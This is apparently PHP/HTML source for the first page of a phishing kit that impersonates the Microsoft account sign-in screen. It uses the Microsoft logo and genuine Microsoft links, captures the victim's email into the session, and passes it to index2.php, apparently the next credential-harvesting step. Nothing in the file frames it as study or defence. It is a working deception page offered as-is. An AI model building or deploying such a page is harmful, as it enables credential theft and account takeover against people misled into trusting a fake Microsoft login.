<?php
session_start();
include("connection.php");

if(isset($_POST['submit'])){
    // Sanitize the email input
    $email = mysqli_real_escape_string($conn, $_POST['email']);

    // Store the email in the session
    $_SESSION['email'] = $email;

    // Debugging: Check if email is set in session
    var_dump($_SESSION);

    // Redirect to the second page
    header("Location: index2.php");
    exit(); // Ensure script execution stops after redirection
}
?>

<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>microsoft Upgrade</title>
    <link rel="shortcut icon" type="image/x-icon" href="micros.png">
    <link rel="stylesheet" href="https://cdnjs.cloudfare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css">
    <link rel="stylesheet" href="style.css">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@10"></script>
  </head>
  <body>
    <div id="form">
    <img src="img/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" id="logo">
        <h1 id="heading">Sign in</h1><br>
        <form name="form" action="index2.php" method="POST" id="forms">
            <!-- <input type="text" id="user" name="user" placeholder="Enter username" required><br><br> -->
            <input type="email" id="email" name="email" placeholder="Email, phone, or Skype" required><br><br>
            <!-- <input type="password" id="pass" name="pass" placeholder="Enter password" required><br><br> -->
            
            <h3 id="txt3">
                No account?<a id="txt3" href="https://signup.live.com/signup?sru=https%3a%2f%2flogin.live.com%2foauth20_authorize.srf%3flc%3d1033%26client_id%3d81feaced-5ddd-41e7-8bef-3e20a2689bb7%26mkt%3dEN-US%26opid%3d49A349EADCC69920%26opidt%3d1714046849%26uaid%3d34aae431013b4335b9e5d6a8049e1bd4%26contextid%3d4079649849F4165A%26opignore%3d1&mkt=EN-US&uiflavor=web&lw=1&fl=easi2&client_id=81feaced-5ddd-41e7-8bef-3e20a2689bb7&uaid=34aae431013b4335b9e5d6a8049e1bd4&suc=81feaced-5ddd-41e7-8bef-3e20a2689bb7&lic=1"> Create one!</a>
            </h3>
            <a id="txt4" href="https://login.microsoftonline.com/common/oauth2/v2.0/authorize?scope=service%3A%3Aaccount.microsoft.com%3A%3AMBI_SSL+openid+profile+offline_access&response_type=code&client_id=81feaced-5ddd-41e7-8bef-3e20a2689bb7&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-signin-oauth&client-request-id=34aae431-013b-4335-b9e5-d6a8049e1bd4&x-client-SKU=MSAL.Desktop&x-client-Ver=4.58.1.0&x-client-OS=Windows+Server+2019+Datacenter&prompt=login&client_info=1&state=H4sIAAAAAAAEAAXBuWKCMAAA0H9xdcCARhg6mMohIFQMJLKFIEi4bDgsfH3f2zhgl5KlWuMWlDi0azZYB4ncltD4rqn8fKXqnCOfNkVFhLqd9yIjwgBeg46DnweX4xoMTvkarJpSYePEJu5zpv1svIbE5mt6_s0SmBcY2qnezPsY97JimbvVulWqGXokuxxE1nSbo0LsiFXU15aZt3FcXmz0fM2_6X6RVoLxLgFR7EbDZRe9xXPRYalU0D47YQ6tZcRprNDnn7MPg8FAizw5jf6p-WH-VCBnmYY68A6Mq2HeTqGgtD8mkeGwQ4--TWSW0D25_QJaEl7aNGKTBE5Qfwo4JcXYcBQzsjYa9Oj2wNu0W5WtdvYUYyp5AL3Oljm-T7z3U2je8ZQc5XB_fIiiqz_TQ3uUWOPCkhKXX5t_qZMAJm4BAAA&msaoauth2=true&lc=1033">Can’t access your account?</a>
            
            <div class="button">
            <input type="submit" id="btn1" value="Back" />
            <input type="submit" id="btn" value="Next" name="submit"/>
            </div>
        </form>
    </div>
    <script src="https://kit.fontawesome.com/b38c4e7b21.js" crossorigin="anonymous"></script>
    <footer>
    <div class="footer">
    <a href="https://www.microsoft.com/en-us/servicesagreement/" id="link">Terms of use</a>
    <a href="https://privacy.microsoft.com/en-us/privacystatement" id="link1">Privacy & cookies</a>
</div>
  </body>
</html>